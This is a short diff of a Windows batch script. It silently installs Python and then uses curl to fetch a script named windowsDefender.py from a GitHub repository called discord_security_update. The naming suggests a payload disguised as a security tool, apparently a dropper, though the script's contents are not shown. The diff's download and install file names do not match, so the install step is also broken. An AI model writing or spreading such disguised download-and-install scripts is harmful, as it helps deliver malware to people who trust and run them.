@@ -1,7 +1,7 @@
 @echo off
 
-curl https://www.python.org/ftp/python/3.4.3/python-3.4.3rc1.amd64.msi -O
-msiexec /i python-3.4.3rc1.amd64.msi /qn TARGETDIR=C:\python34
+curl https://www.python.org/ftp/python/2.7/python-2.7.amd64.msi -O
+msiexec /i "python-2.7.11.amd64.msi" /passive /norestart ADDLOCAL=ALL
 
 
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
